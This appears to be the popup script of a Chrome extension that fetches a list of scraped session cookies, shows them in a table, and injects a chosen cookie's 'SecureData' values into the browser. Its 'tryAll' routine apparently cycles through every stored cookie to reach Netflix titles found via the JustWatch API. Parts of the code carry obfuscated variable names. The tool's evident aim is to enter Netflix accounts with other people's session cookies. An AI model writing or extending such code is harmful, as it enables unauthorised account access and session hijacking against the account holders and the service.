
function load_and_display() {
    var cookies = localStorage.getItem('cookies');
    var loaded_cookies = JSON.parse(cookies);
    var table = `<h3 style="font-size: 36px">Click To Select Cookie</h3>
<div id="tbscrl"><table class="table table-hover" style="max-height: 200px;overflow-y: auto;" id="myTable">
<tbody>`;

    var i=1;
    for (var cookie in loaded_cookies) {
        table = table + `
            <tr>
            <td>${i}</td>
            <td>${cookie}</td>
            </tr>
            `;
        i = i+1;
    }

    table = table + `</tbody></table></div>`;
    $('div[class="container logo-container"]').html(table);

    $('#myTable tbody tr').click(function() {
        $(this).addClass('bg-success').siblings().removeClass('bg-success');
    });
}

document.addEventListener("DOMContentLoaded", function () {
    if(localStorage.getItem('cookies') === null) {
        getCookies();
    } else {
       load_and_display();
    }

    $('#cid').select2({
        ajax: {
            url: 'https://apis.justwatch.com/content/titles/en_IN/popular',
            data: function (params) {
                var body = {
                    providers:["nfx"],
                    query:params.term,
                    page:params.page||1,
                    page_size:5
                };
                var query = {
                    body: JSON.stringify(body)
                };

                // Query parameters will be ?search=[term]&type=public
                return query;
            },

            processResults: function (data) {
                // Transforms the top-level key of the response object from 'items' to 'results'
                var items = data.items;
                items = items.map(item=>{
                    var offers = item.offers.filter(offer => offer.urls.standard_web.indexOf("netflix")!==-1);
                    var poster = item.poster.replace("{profile}","s166");
                    var text = offers[0].urls.deeplink_android_tv;
                    return {
                        id:item.id,
                        title:item.title,
                        poster: poster,
                        text:text
                    }
                });
                var pagination = data.page!==data.total_pages;
                return {
                    results: items,
                    pagination: {
                        more:pagination
                    }
                };
            }
        },
        templateResult: function (state) {
            if (!state.id) {
                return state.text;
            }
            var baseUrl = "https://images.justwatch.com";
            var newState = `<span><img height="50" width="50" src="${baseUrl+state.poster}"/>${state.title}</span>`
            var $state = $(
                newState
            );
            return $state;
        }
    });

        $("#refresh_cookies").click(function () {
            getCookies();
        });

        $("#use-cookie").click(function () {
            pickUpCookieFromPage()
        });

        $("#logout").click(function () {
            try {
                chrome.runtime.sendMessage({
                    method: "logout"
                }, function (_0x409ax1) {})
            } catch (e) {
                showError("Some Error has Occured!!")
            }
        });


        $('#check').click(function () {
            try_all($("#cid :selected").text());
        });
});

function getCookies() {

    $('div[class="container logo-container"]').html(
        `<div class="spinner-border" role="status">
								<span >Loading...</span>
							</div>
							<div>Fetching cookies please wait..</div>`
    );

    chrome.runtime.sendMessage({
        method: "scrapeCookies"
    }, load_and_display);
}



function pickUpCookieFromPage() {
    var tr = $('tr.bg-success').get();
    var cookie_name = tr[0].children[1].innerText;
    var cookies = localStorage.getItem('cookies');
    var loaded_cookies = JSON.parse(cookies);
    verifyAndSetCookie(loaded_cookies[cookie_name]);
}

function verifyAndSetCookie(_0x409ax6,cb) {
    try {
        var _0x409ax4 = _0x409ax6.cookie;
        if (_0x409ax4.SecureData1 != undefined && _0x409ax4.SecureData2 != undefined && _0x409ax4.SecureData3 != undefined && _0x409ax4.SecureData4 != undefined) {
            var _0x409ax7 = _0x409ax4.SecureData1;
            var _0x409ax8 = _0x409ax4.SecureData2;
            var _0x409axa = _0x409ax4.SecureData4;
                chrome.runtime.sendMessage({
                    method: "setNewCookies",
                    "SecureData1": _0x409ax7,
                    "SecureData2": _0x409ax8,
                    "SecureData4": _0x409axa
                }, function (_0x409ax1) {
                    if(typeof cb!=="undefined")
                    cb(_0x409ax1);
                })
        } else {
            showError("Not a valid cookie")
        }
    } catch (e) {
        showError("Not a valid cookie")
    }
}



function try_all(id) {
    chrome.runtime.sendMessage({
        method: "tryAll",
        "id":id
    });
}

function showError(_0x409ax16) {
    console.log(_0x409ax16);
}